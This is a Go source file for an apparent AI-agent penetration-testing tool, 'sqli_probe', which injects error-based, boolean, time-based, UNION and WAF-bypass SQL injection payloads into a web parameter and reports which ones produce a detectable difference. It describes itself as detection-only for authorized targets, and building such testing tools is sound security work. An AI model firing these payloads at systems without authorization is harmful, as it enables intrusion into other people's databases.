package builtin

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"

	"reasonix/internal/tool"
)

func init() { tool.RegisterBuiltin(sqliProbe{}) }

// sqliProbe detects and verifies SQL injection on an authorized target. It
// sends a benign baseline followed by detection payloads (error, boolean,
// time) and reports which technique produced a verifiable differential. It
// never extracts data: exploitation beyond verification stays manual and
// requires explicit per-action confirmation under the engagement policy.
type sqliProbe struct{}

func (sqliProbe) Name() string { return "sqli_probe" }

func (sqliProbe) Description() string {
	return "Detect SQL injection on an authorized target: inject a benign baseline plus error/boolean/time-based detection payloads into one GET/POST parameter and report which technique produced a verifiable differential with evidence. payload_mode=true returns a payload dictionary (incl. WAF-bypass variants) without sending requests. Detection only - no data extraction. Offensive action - requires user-authorized target."
}

func (sqliProbe) Schema() json.RawMessage {
	return json.RawMessage(`{"type":"object","properties":{"url":{"type":"string","description":"Target URL; the tested parameter is added to the query string (GET) or form body (POST)"},"param":{"type":"string","description":"Name of the parameter to test"},"method":{"type":"string","description":"GET or POST (default GET)"},"data":{"type":"string","description":"POST form body template; the tested parameter is replaced/appended (e.g. \"user=admin&pass=x\")"},"headers":{"type":"string","description":"Extra request headers as \"Key: Value\" lines separated by newlines"},"timeout_ms":{"type":"integer","description":"Per-request timeout in ms (default 8000)"},"time_delay_s":{"type":"integer","description":"Delay in seconds for time-based payloads (default 5)"},"payload_mode":{"type":"boolean","description":"When true, return the payload dictionary only - no requests are sent"}},"required":["url","param"]}`)
}

func (sqliProbe) ReadOnly() bool { return false }

// SnipHint keeps the verdict header and first techniques; tails carry timing
// details.
func (sqliProbe) SnipHint() tool.SnipHint {
	return tool.SnipHint{Head: 80, Tail: 10, HeadChars: 10000, TailChars: 1500}
}

// sqliErrorSignatures match database error text leaking in responses.
var sqliErrorSignatures = []*regexp.Regexp{
	regexp.MustCompile(`(?i)you have an error in your sql syntax`),
	regexp.MustCompile(`(?i)warning:\s*(mysqli?|mysql|pg_)`),
	regexp.MustCompile(`(?i)unclosed quotation mark`),
	regexp.MustCompile(`(?i)microsoft ole db provider for sql server`),
	regexp.MustCompile(`(?i)ORA-[0-9]{5}`),
	regexp.MustCompile(`(?i)PostgreSQL.*(ERROR|FATAL)`),
	regexp.MustCompile(`(?i)SQLite3?::?(query|exec)`),
	regexp.MustCompile(`(?i)SQLSTATE\[`),
	regexp.MustCompile(`(?i)syntax error at or near`),
	regexp.MustCompile(`(?i)unterminated quoted string`),
	regexp.MustCompile(`(?i)com\.mysql\.jdbc`),
	regexp.MustCompile(`(?i)JDBC (Driver|Exception)`),
}

// sqliPayloadDict is also served verbatim in payload_mode.
var sqliPayloadDict = map[string][]string{
	"error":   {`'`, `"`, `\`, `' --`, `') --`, `1'`, `1"`, `admin' --`},
	"boolean": {`' OR '1'='1`, `' OR '1'='2`, `1 OR 1=1`, `1 OR 1=2`, `' AND '1'='1`, `' AND '1'='2`},
	"time":    {`' OR SLEEP(5)-- -`, `'; WAITFOR DELAY '0:0:5'-- -`, `' || pg_sleep(5)-- -`, `1; SELECT SLEEP(5)`},
	"union":   {`' UNION SELECT NULL-- -`, `' UNION SELECT NULL,NULL-- -`, `-1' UNION SELECT 1,2,3-- -`},
	"waf-bypass": {
		`'/**/OR/**/1=1-- -`, `%27%20OR%201%3D1--`, `' oR 1=1-- -`,
		`' /*!50000OR*/ 1=1-- -`, `' AND CHAR(115)=CHAR(115)`, `'||(SELECT '')||'`,
	},
	"comments": {`-- -`, `#`, `/*`, `;`},
}

type sqliRequest struct {
	url     string
	method  string
	data    string
	param   string
	headers map[string]string
	timeout time.Duration
}

type sqliResponse struct {
	status int
	length int
	hash   string
	body   string
	took   time.Duration
}

func (r sqliRequest) send(ctx context.Context, value string) (sqliResponse, error) {
	var bodyReader io.Reader
	target := r.url
	if strings.EqualFold(r.method, "POST") {
		form := r.data
		if form == "" {
			form = url.Values{r.param: {value}}.Encode()
		} else if strings.Contains(form, r.param+"=") {
			form = replaceFormValue(form, r.param, value)
		} else {
			form += "&" + url.Values{r.param: {value}}.Encode()
		}
		bodyReader = strings.NewReader(form)
	} else {
		u, err := url.Parse(r.url)
		if err != nil {
			return sqliResponse{}, err
		}
		q := u.Query()
		q.Set(r.param, value)
		u.RawQuery = q.Encode()
		target = u.String()
	}

	req, err := http.NewRequestWithContext(ctx, strings.ToUpper(r.method), target, bodyReader)
	if err != nil {
		return sqliResponse{}, err
	}
	if strings.EqualFold(r.method, "POST") {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; Reasonix-Pentest/1.0)")
	for k, v := range r.headers {
		req.Header.Set(k, v)
	}

	client := &http.Client{Timeout: r.timeout}
	start := time.Now()
	resp, err := client.Do(req)
	if err != nil {
		return sqliResponse{took: time.Since(start)}, err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	sum := sha256.Sum256(body)
	return sqliResponse{
		status: resp.StatusCode,
		length: len(body),
		hash:   hex.EncodeToString(sum[:8]),
		body:   string(body),
		took:   time.Since(start),
	}, nil
}

// replaceFormValue swaps one form field's value while keeping the others.
func replaceFormValue(form, param, value string) string {
	values, err := url.ParseQuery(form)
	if err != nil {
		return form
	}
	values.Set(param, value)
	return values.Encode()
}

func (sqliProbe) Execute(ctx context.Context, args json.RawMessage) (string, error) {
	p := struct {
		URL        string `json:"url"`
		Param      string `json:"param"`
		Method     string `json:"method"`
		Data       string `json:"data"`
		Headers    string `json:"headers"`
		TimeoutMs  int    `json:"timeout_ms"`
		TimeDelayS int    `json:"time_delay_s"`
		Payloads   bool   `json:"payload_mode"`
	}{Method: "GET", TimeoutMs: 8000, TimeDelayS: 5}
	if len(args) > 0 {
		if err := json.Unmarshal(args, &p); err != nil {
			return "", fmt.Errorf("invalid args: %w", err)
		}
	}
	if strings.TrimSpace(p.URL) == "" || strings.TrimSpace(p.Param) == "" {
		return "", fmt.Errorf("url and param are required")
	}
	if p.Payloads {
		return renderPayloadDict(p.TimeDelayS), nil
	}
	if p.TimeoutMs < 500 || p.TimeoutMs > 60000 {
		p.TimeoutMs = 8000
	}
	if p.TimeDelayS < 2 || p.TimeDelayS > 15 {
		p.TimeDelayS = 5
	}
	headers := map[string]string{}
	for _, line := range strings.Split(p.Headers, "\n") {
		if k, v, ok := strings.Cut(line, ":"); ok {
			headers[strings.TrimSpace(k)] = strings.TrimSpace(v)
		}
	}
	r := sqliRequest{
		url:     strings.TrimSpace(p.URL),
		method:  strings.ToUpper(strings.TrimSpace(p.Method)),
		data:    p.Data,
		param:   strings.TrimSpace(p.Param),
		headers: headers,
		timeout: time.Duration(p.TimeoutMs) * time.Millisecond,
	}
	if r.method != "GET" && r.method != "POST" {
		return "", fmt.Errorf("method must be GET or POST")
	}

	var b strings.Builder
	fmt.Fprintf(&b, "SQLi probe: %s %s param=%q\n", r.method, r.url, r.param)

	baseline, err := r.send(ctx, "rxbaseline")
	if err != nil {
		return "", fmt.Errorf("baseline request failed (target unreachable?): %w", err)
	}
	fmt.Fprintf(&b, "baseline: status=%d len=%d hash=%s took=%dms\n",
		baseline.status, baseline.length, baseline.hash, baseline.took.Milliseconds())

	findings := 0

	// 1. Error-based: single-quote style payloads that surface SQL errors.
	for _, payload := range sqliPayloadDict["error"] {
		resp, err := r.send(ctx, payload)
		if err != nil {
			continue
		}
		if sig := matchErrorSignature(resp.body); sig != "" && matchErrorSignature(baseline.body) == "" {
			fmt.Fprintf(&b, "FINDING error-based: payload %q triggered %q (status=%d len=%d)\n",
				payload, sig, resp.status, resp.length)
			findings++
			break
		}
	}

	// 2. Boolean-based: tautology matches baseline, contradiction differs.
	trueResp, err1 := r.send(ctx, `' OR '1'='1`)
	falseResp, err2 := r.send(ctx, `' OR '1'='2`)
	if err1 == nil && err2 == nil {
		trueSame := trueResp.hash == baseline.hash || lengthClose(trueResp.length, baseline.length)
		falseDiff := falseResp.hash != baseline.hash && !lengthClose(falseResp.length, baseline.length)
		if trueSame && falseDiff {
			fmt.Fprintf(&b, "FINDING boolean-based: tautology matches baseline (len=%d), contradiction differs (len=%d vs %d)\n",
				trueResp.length, falseResp.length, baseline.length)
			findings++
		}
	}

	// 3. Time-based: delayed responses vs a fast baseline.
	delay := time.Duration(p.TimeDelayS) * time.Second
	threshold := delay - time.Second
	for _, tmpl := range sqliPayloadDict["time"] {
		payload := strings.ReplaceAll(tmpl, "5", fmt.Sprintf("%d", p.TimeDelayS))
		resp, err := r.send(ctx, payload)
		if err != nil {
			continue
		}
		if resp.took >= threshold && baseline.took < threshold {
			fmt.Fprintf(&b, "FINDING time-based: payload %q took %dms (baseline %dms)\n",
				payload, resp.took.Milliseconds(), baseline.took.Milliseconds())
			findings++
			break
		}
	}

	if findings == 0 {
		b.WriteString("verdict: no injection differential detected on this parameter (try other parameters, headers like Cookie/X-Forwarded-For, or JSON bodies)\n")
	} else {
		fmt.Fprintf(&b, "verdict: LIKELY INJECTABLE via %d technique(s) - record evidence and confirm exploitation scope with the user before going deeper\n", findings)
	}
	return b.String(), nil
}

func matchErrorSignature(body string) string {
	for _, re := range sqliErrorSignatures {
		if m := re.FindString(body); m != "" {
			return m
		}
	}
	return ""
}

// lengthClose treats bodies with nearly identical sizes as equivalent -
// dynamic tokens (CSRF, timestamps) shift lengths without changing semantics.
// The tolerance is relative (10%): a tiny absolute floor only covers rounding,
// because on small pages (SPA shells, empty-result pages) even a few bytes
// carry meaning.
func lengthClose(a, b int) bool {
	d := a - b
	if d < 0 {
		d = -d
	}
	return d <= 4 || float64(d) <= 0.10*float64(max(a, b))
}

func renderPayloadDict(delay int) string {
	var b strings.Builder
	b.WriteString("SQLi payload dictionary (detection + verification; extraction is out of scope):\n")
	for _, cat := range []string{"error", "boolean", "time", "union", "waf-bypass", "comments"} {
		fmt.Fprintf(&b, "-- %s --\n", cat)
		for _, p := range sqliPayloadDict[cat] {
			fmt.Fprintf(&b, "%s\n", strings.ReplaceAll(p, "(5)", fmt.Sprintf("(%d)", delay)))
		}
	}
	return b.String()
}
